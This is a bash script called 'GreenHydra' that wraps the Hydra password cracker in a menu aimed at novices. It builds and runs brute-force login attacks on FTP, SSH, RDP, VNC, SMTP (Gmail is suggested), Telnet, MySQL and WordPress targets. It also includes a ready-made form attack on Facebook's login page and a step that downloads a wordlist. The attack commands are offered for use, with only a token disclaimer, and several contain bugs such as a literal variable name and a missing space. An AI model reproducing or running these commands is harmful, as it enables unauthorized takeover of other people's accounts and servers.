#!/bin/bash
########################Mamoun benhafsa TheDev
#################################Dont take my copiright 
####################################Learn How To make One Like That dont Take Project Of other Devlopper 
#####################################"tHIS SCRIPT MAKE FOR NOOB WHO CANNOT USE HYDRA "
##################################"MY blog : https://www.thedevevil.ml"
echo 
clear
resize -s 40 92 > /dev/null
# ---------------------
# check if user is root
# ---------------------
if [ $(id -u) != "0" ]; then
  echo "[x] we need to be root to run this script..."
  echo "[x] execute [ sudo ./venom.sh ] on terminal"
  exit
else
  :
fi
echo -e "Please do not use in military or secret service organizations, or for illegal purposes" && echo ""
sleep 1
echo "[*] Press [ENTER] to continue .."
read op
clear


echo  "                     #########*Welcome On GreenHydrA*#########"
echo  "                     #########*Welcom On Green Hydra*#########"
echo  "            #########*/*Green Hydra Is a script compiler For Hydra*/*#########"
echo -e "           \e[1;31m Type With Service Tou Want To Bruteforce By Nember Ex : 6 fOR telnet
                      +-------------------------------------+----+
                      |     >Bruteforce Ftp<                | *1*|
                      +-------------------------------------+----+  
                      +-------------------------------------+----+
                      |     >Bruteforce SSH<                | *2*|
                      +-------------------------------------+----+  
                      +-------------------------------------+----+
                      |      >Bruteforce Rdp<               | *3*|
                      +-------------------------------------+----+  
                      +-------------------------------------+----+
                      |      >Bruteforce Vnc<               | *4*|
                      +-------------------------------------+----+  
                      +-------------------------------------+----+
                      |      >Bruteforce Smtp<              | *5*|
                      +-------------------------------------+----+  
                      +-------------------------------------+----+
                      |      >Bruteforce Telnet<            | *6*|
                      +-------------------------------------+----+  
                      +-------------------------------------+----+
                      |      >Bruteforce mysql<             | *7*|
                      +-------------------------------------+----+  
                      +-------------------------------------+----+
                      |      > Bruteforce Facebook<         | *8*| 
                      +-------------------------------------+----+ 
                      +-------------------------------------+----+
                      |      >Bruteforce Wordpress<         | *9*|  
                      +-------------------------------------+----+
                      +-------------------------------------+----+
                      |      >Continue Last Bruteforce <    |*10*| 
                      +-------------------------------------+----+ 
                      +-------------------------------------+----+
                      |      >Download Wordlist <           |*11*| 
                      +-------------------------------------+----+ 
                      +-------------------------------------+----+
                      |            >Exit<                   |*12*| 
                      +-------------------------------------+----+ 
                      \e[0m"
echo -e "                            See Our Blog :\033[31m www.thedevevil.ml\033[0m"
########################Mamoun benhafsa TheDev
#################################Dont take my copiright 
####################################Learn How To make One Like That dont Take Project Of other Devlopper 
#####################################"tHIS SCRIPT MAKE FOR NOOB WHO CANNOT USE HYDRA "
##################################"MY blog : https://www.thedevevil.ml"
read -p 'GreenHydra>: ' clis
case $clis in
	 1)
echo
clear
echo "Put User Login :Ex Admin"
read -p 'GreenHydra--->Ftp-->' Ftpuser 
echo "Put Adresse Host Ip "
read -p 'GreenHydra--->Ftp-->' Ftpadress
echo "Put Port "
read -p 'GreenHydra--->Ftp-->' Ftpport
echo "Put Password list Patch "
read -p 'GreenHydra--->Ftp-->'  Ftpwordlist 
echo -e "
\033[45m                       +---------------------+----------------+
                               |>Ftp User<           |$Ftpuser        |  
                               +---------------------+----------------+
                               |>Ftp Adresse Host Ip<|$Ftpadress      |
                               +---------------------+----------------+
                               |>Ftp Port To use<    |$Ftpport        |  
                               +---------------------+----------------+
                               |>Wordlist To use<    |$Ftpwordlist    |  
                               +---------------------+----------------+\033[0m"
                               ########################Mamoun benhafsa TheDev
#################################Dont take my copiright 
####################################Learn How To make One Like That dont Take Project Of other Devlopper 
#####################################"tHIS SCRIPT MAKE FOR NOOB WHO CANNOT USE HYDRA "
##################################"MY blog : https://www.thedevevil.ml"
read -p "Press enter to continue"
echo 
    hydra -V -s $Ftpport -l Ftpuser -P $Ftpwordlist ftp://$Ftpadress
		;;
		2)
echo 
clear
echo "Put User Login Ex: root"
read -p 'GreenHydra--->SSH-->' Sshlogin
echo "Put Adresse Host Ip"
read -p 'GreenHydra--->SSH-->' Sshadress
echo "Put Ssh Port Ex: 22 "
read -p 'GreenHydra--->SSH-->' Sshport
echo "Wordlist Path "
read -p 'GreenHydra--->SSH-->' Sshworslist 
echo -e "
\033[45m                       +---------------------+----------------+
                               |>Ssh User<           |$Sshlogin        |  
                               +---------------------+----------------+
                               |>Ssh Adresse Host Ip<|$Sshadress      |
                               +---------------------+----------------+
                               |>Ssh Port To use<    |$Sshport        |  
                               +---------------------+----------------+
                               |>Wordlist To use<    |$Sshworslist    |  
                               +---------------------+----------------+\033[0m"
                               ########################Mamoun benhafsa TheDev
#################################Dont take my copiright 
####################################Learn How To make One Like That dont Take Project Of other Devlopper 
#####################################"tHIS SCRIPT MAKE FOR NOOB WHO CANNOT USE HYDRA "
##################################"MY blog : https://www.thedevevil.ml"
read -p "Press enter to continue"
echo
    hydra -l $Sshlogin -P $Sshworslist -s $Sshport $Sshadress ssh
        ;;
        3)
echo "Put User Login Ex: Admin"
read -p 'GreenHydra--->Rdp-->' RdpLogin 
echo "Put Adresse Host "
read -p 'GreenHydra--->Rdp-->' Rdpadress
echo 'Put Wordlist ' 
read -p 'GreenHydra--->Rdp-->' Rdpwordlist 
echo -e "
\033[45m                       +---------------------+----------------+
                               |>Rdp User<           |$RdpLogin        |  
                               +---------------------+----------------+
                               |>Rdp Adresse Host Ip<|$Rdpadress      |
                               +---------------------+----------------+
                               |>Wordlist To use<    |$Rdpwordlist    |  
                               +---------------------+----------------+\033[0m"
                               ########################Mamoun benhafsa TheDev
#################################Dont take my copiright 
####################################Learn How To make One Like That dont Take Project Of other Devlopper 
#####################################"tHIS SCRIPT MAKE FOR NOOB WHO CANNOT USE HYDRA "
##################################"MY blog : https://www.thedevevil.ml"
read -p "Press enter to continue"
echo 
     hydra -t 1 -V -f -l $RdpLogin -P $Rdpwordlist rdp://$Rdpadress
        ;;
        4)
echo "Put Adresse Host Ip "
read -p 'GreenHydra--->VNC-->' vncadresse
echo "Put Port Ex: 5900" 
read -p 'GreenHydra--->VNC-->' vncport
echo "Put Wordlist Path"
read -p 'GreenHydra--->VNC-->' vncwordlist
echo +e "
\033[45m                       +---------------------+----------------+
                               |>vnc Adresse Host Ip<|$vncadresse      |
                               +---------------------+----------------+
                               |>vnc Port To use<    |$vncport        |  
                               +---------------------+----------------+
                               |>Wordlist To use<    |$vncwordlist    |  
                               +---------------------+----------------+\033[0m"
                               ########################Mamoun benhafsa TheDev
#################################Dont take my copiright 
####################################Learn How To make One Like That dont Take Project Of other Devlopper 
#####################################"tHIS SCRIPT MAKE FOR NOOB WHO CANNOT USE HYDRA "
##################################"MY blog : https://www.thedevevil.ml"
read -p "Press enter to continue"
echo 
    hydra -P $vncwordlist vnc://$vncadresse:$vncport
        ;;
        5)
echo "Put Smtp Adress Host Ip "
echo -e "For Gmail : Adress= smtp.gmail.com Port= 465"
read -p 'GreenHydra--->Smtp-->' Smtpadress
echo "Put Adress Port Ex : 465"
read -p 'GreenHydra--->Smtp-->' Smtpport
echo "Put Email Ex: email@smtp.com"
read -p 'GreenHydra--->Smtp-->' Smtpemail
echo "Put Wordlist Path"
read -p 'GreenHydra--->Smtp-->' Smtppath
echo -e "
\033[45m                       +---------------------+----------------+
                               |>Smtp Mail<           |$Smtpemail        |  
                               +---------------------+----------------+
                               |>Smtp Adresse Host Ip<|$Smtpadress      |
                               +---------------------+----------------+
                               |>Smtp Port To use<    |$Smtpport        |  
                               +---------------------+----------------+
                               |>Wordlist To use<    |$Smtppath    |  
                               +---------------------+----------------+\033[0m"
                               ########################Mamoun benhafsa TheDev
#################################Dont take my copiright 
####################################Learn How To make One Like That dont Take Project Of other Devlopper 
#####################################"tHIS SCRIPT MAKE FOR NOOB WHO CANNOT USE HYDRA "
##################################"MY blog : https://www.thedevevil.ml"
read -p "Press enter to continue"
echo 
hydra -S -l $Smtpemail -P $Smtppath -e ns -V -t 1 -w 30 -s $Smtpport $Smtpadress smtp
        ;;
        6)
echo "Put Telnet Adress Host Ip "
read -p 'GreenHydra--->Telnet-->' Telnetadress
echo "Put Login User Ex: admin"
read -p 'GreenHydra--->Telnet-->' Telnetuser 
echo "Put Port Ex: 23"
read -p 'GreenHydra--->Telnet-->' Telnetport
echo "Put wordlist Patch "
read -p 'GreenHydra--->Telnet-->' Telnetpath
echo -e "
\033[45m                       +---------------------+----------------+
                               |>Telnet User<           |$Telnetuser        |  
                               +---------------------+----------------+
                               |>Telnet Adresse Host Ip<|$Telnetadress      |
                               +---------------------+----------------+
                               |>Telnet Port To use<    |$Telnetport        |  
                               +---------------------+----------------+
                               |>Wordlist To use<    |$Telnetpath    |  
                               +---------------------+----------------+\033[0m"
                               ########################Mamoun benhafsa TheDev
#################################Dont take my copiright 
####################################Learn How To make One Like That dont Take Project Of other Devlopper 
#####################################"tHIS SCRIPT MAKE FOR NOOB WHO CANNOT USE HYDRA "
##################################"MY blog : https://www.thedevevil.ml"
read -p "Press enter to continue"
echo 
     hydra -l $Telnetuser-P $Telnetpath $Telnetadress telnet
        ;;
        7)
echo "Put Mysql User Loginex: root"
read -p 'GreenHydra--->Mysql-->' Mysqllogin
echo "Put Mysql Adress Host Ip"
read -p 'GreenHydra--->Mysql-->' Mysqladress
echo "Put Port Ex: 3360"
read -p 'GreenHydra--->Mysql-->' Mysqlport
echo "Put Wordlist Patch "
read -p 'GreenHydra--->Mysql-->' Mysqlpath
echo -e "
\033[45m                       +-----------------------+--------------+
                               |>Mysql Login<          |$Mysqllogin     |  
                               +-----------------------+----------------+
                               |>Mysql Adresse Host Ip<|$Mysqladress    |
                               +---------------------+----------------+
                               |>Mysql Port To use<  |$Mysqlport        |  
                               +---------------------+----------------+
                               |>Wordlist To use<    |$Mysqlpath    |  
                               +---------------------+----------------+\033[0m"
                               ########################Mamoun benhafsa TheDev
#################################Dont take my copiright 
####################################Learn How To make One Like That dont Take Project Of other Devlopper 
#####################################"tHIS SCRIPT MAKE FOR NOOB WHO CANNOT USE HYDRA "
##################################"MY blog : https://www.thedevevil.ml"
read -p "Press enter to continue"
echo 
    hydra -t 4 -V -f -l $Mysqllogin -e ns -P $Mysqlpath $Mysqladress mysql
        ;;
        8)
echo "Put Facebook Login orm Phone Nember Or email  "
read -p 'GreenHydra--->Facebook-->' Facebookid
echo "Put Wordlist Patch"
read -p 'GreenHydra--->Facebook-->' Facebookpatch
echo -e "                     Check Information If Ther Is an erore Exit & Restart 
\033[45m                       +---------------------+----------------+
                               |>Facebook User<      |$Facebookid     |  
                               +---------------------+----------------+ 
                               +---------------------+----------------+
                               |>Wordlist To use<    |$Facebookpatch  |  
                               +---------------------+----------------+\033[0m"
                               ########################Mamoun benhafsa TheDev
#################################Dont take my copiright 
####################################Learn How To make One Like That dont Take Project Of other Devlopper 
#####################################"tHIS SCRIPT MAKE FOR NOOB WHO CANNOT USE HYDRA "
##################################"MY blog : https://www.thedevevil.ml"
echo 
    hydra -l $Facebookid -P $Facebookpatch -t 1 -W 15 -v -V fr-fr.facebook.com https-post-form "/login.php?login_attempt=1&lwv=100:
lsd=AVq2DYuR&display=&enable_profile_selector=&isprivate=&legacy_return=1&profile_selector_ids=&skip_api_login=&signed_next=&trynum=2&timezone=-120&lgndim=eyJ3IjoxNjAwLCJoIjo5MDAsImF3IjoxNjAwLCJhaCI6ODczLCJjIjoyNH0%3D&lgnrnd=123248_Alo7&lgnjs=1465500766&email=^USER^&pass=^PASS^&persistent=&default_persistent=1&qsstamp=W1tbMTksMzAsNDAsNDEsNDcsNTIsNjIsNjUsODgsOTksMTExLDE0NywyNDAsMjU1LDI2MCwyNjMsMjY4LDI3
NiwzMDMsMzA0LDMyOCwzMzUsMzczLDM4OSwzOTMsNDA0LDQzNiw0NDUsNDUwLDQ3OSw0ODIsNDg1LDUwNiw1MjYs
NTM5LDU0OCw1NzUsNTkzLDYwNSw2NjUsNjcyLDcyMl1dLCJBWm5rMnpRUnRTZks5d2h3RzlGWGh3TGpSVEUtQ0R0Z3
M1SDBoUXhCajNSVlU0ZWxLWEs0NVh2TVFTWnVsRlRtQUNKcHZvRE5hLVYtZ1doZVgxWUJVZ0d0d2xtOG9EeW1IbnA3Sj
dPUlBXSGFJd3VRMmloeURxYm1nd2d6T3NVTnY4Ym9aQzBYdlRrNjhzN0VuVE1LQnhWN21DXzhyMS13bTdPYU05SG9laW
FIRHROS0FqTnlmNUJ2WjdyYTM2S3pBQVNXQk1GVkVSVzVMcVNFY1doczdtSmNpUHN2WV9SMHpiU1p6R0FzVm5iakRlWW
04WENvWkJuX3ZRakswSGRMX3hVIl0%3
:F=incorrect"
        ;;
        9)
echo "Put wordpress Host Ex: www.wordpress.com "
read -p '' Wordpressadress
echo "Put Username Login Ex: admin"
read -p '' Wordpresslogin
echo "Put Wordpress login page  Url Ex:/wp/Forum/login.php"
read -p '' Wordpressurl
echo "Put Wordlist Patch"
read -p '' Wordpresspatch
echo -e "
\033[45m                       +---------------------+----------------+
                               |>Wordpress Adresse Host Ip<|$Wordpressadress      |
                               +---------------------+----------------+
                               |>Wordpress User Login<    |$Wordpresslogin       |  
                               +---------------------+----------------+
                               |>Wordpress Url<    |$Wordpressurl    |  
                               +---------------------+----------------+
                               +---------------------+----------------+
                               |>Wordlist To use<    |$Wordpresspatch        |  
                               +---------------------+----------------+ \033[0m"
                               ########################Mamoun benhafsa TheDev
#################################Dont take my copiright 
####################################Learn How To make One Like That dont Take Project Of other Devlopper 
#####################################"tHIS SCRIPT MAKE FOR NOOB WHO CANNOT USE HYDRA "
##################################"MY blog : https://www.thedevevil.ml"
read -p "Press enter to continue"
echo
    hydra -l $Wordpresslogin -P $Wordpresspatch  -vV -f -t 2 $Wordpressadress http-post-form "$Wordpressurl:log=^USER^&pwd=^PASS^:login_error"
        ;;
        10)
echo "Ok"

        ;;
        11)
echo "Now We will Download Best Wordlist we have and put it On wordlist Folder "
mkdir wordlist
echo
cd wordlist
echo "[###  ]"
wget -b https://raw.githubusercontent.com/MaMo-ben/Wibr-/master/woslists/birthday.txt
echo "[#### ]"
wget -b https://raw.githubusercontent.com/MaMo-ben/Wibr-/master/woslists/birthday.txt
echo "[######]"
echo -e "                                          Saved On wordlist Folder " && echo ""
sleep 1
echo "[*] Press [ENTER] to continue .."
read op
clear
bash start.sh
       ;;
       12)
clear
echo "                                Dow You Want To exit Exit "
read -p 'Presss Any Key To exit'
echo "         By            By       By            By         By            By"
echo "                  By            By       By            By         By            By"
echo "       By            By       By            By         By            By"
echo "      By            By       By            By         By            By"
echo "      By            By       By            By         By            By"
echo "          By            By       By            By         By            By"
echo "                By            By       By            By         By            By"
echo "                By            By       By            By         By            By"
echo "       By            By       By            By         By            By"
echo "                  By            By       By            By         By            By"
echo "           By            By       By            By         By            By"
echo "                 By            By       By            By         By            By"
echo "            By            By       By            By         By            By"
echo "     By            By       By            By         By            By"
echo "       By            By       By            By         By            By"
echo "       By            By       By            By         By            By"
echo "       By            By       By            By         By            By"
echo "       By            By       By            By         By            By"
echo "       By            By       By            By         By            By"
echo "       By            By       By            By         By            By"
echo "       By            By       By            By         By            By"
echo "       By            By       By            By         By            By"
echo "       By            By       By            By         By            By"
echo "       By            By       By            By         By            By"
echo "       By            By       By            By         By            By"
echo "       By            By       By            By         By            By"
echo "       By            By       By            By         By            By"
echo "       By            By       By            By         By            By"

esac
########################Mamoun benhafsa TheDev
#################################Dont take my copiright 
####################################Learn How To make One Like That dont Take Project Of other Devlopper 
#####################################"tHIS SCRIPT MAKE FOR NOOB WHO CANNOT USE HYDRA "
##################################"MY blog : https://www.thedevevil.ml"
########################Mamoun benhafsa TheDev
#################################Dont take my copiright 
####################################Learn How To make One Like That dont Take Project Of other Devlopper 
#####################################"tHIS SCRIPT MAKE FOR NOOB WHO CANNOT USE HYDRA "
##################################"MY blog : https://www.thedevevil.ml"
########################Mamoun benhafsa TheDev
#################################Dont take my copiright 
####################################Learn How To make One Like That dont Take Project Of other Devlopper 
#####################################"tHIS SCRIPT MAKE FOR NOOB WHO CANNOT USE HYDRA "
##################################"MY blog : https://www.thedevevil.ml"
########################Mamoun benhafsa TheDev
#################################Dont take my copiright 
####################################Learn How To make One Like That dont Take Project Of other Devlopper 
#####################################"tHIS SCRIPT MAKE FOR NOOB WHO CANNOT USE HYDRA "
##################################"MY blog : https://www.thedevevil.ml"
########################Mamoun benhafsa TheDev
#################################Dont take my copiright 
####################################Learn How To make One Like That dont Take Project Of other Devlopper 
#####################################"tHIS SCRIPT MAKE FOR NOOB WHO CANNOT USE HYDRA "
##################################"MY blog : https://www.thedevevil.ml"########################Mamoun benhafsa TheDev
#################################Dont take my copiright 
####################################Learn How To make One Like That dont Take Project Of other Devlopper 
#####################################"tHIS SCRIPT MAKE FOR NOOB WHO CANNOT USE HYDRA "
##################################"MY blog : https://www.thedevevil.ml"########################Mamoun benhafsa TheDev
#################################Dont take my copiright 
####################################Learn How To make One Like That dont Take Project Of other Devlopper 
#####################################"tHIS SCRIPT MAKE FOR NOOB WHO CANNOT USE HYDRA "
##################################"MY blog : https://www.thedevevil.ml"



###################################Mamoun Benhafsa #############The DEv ###########Mamo ################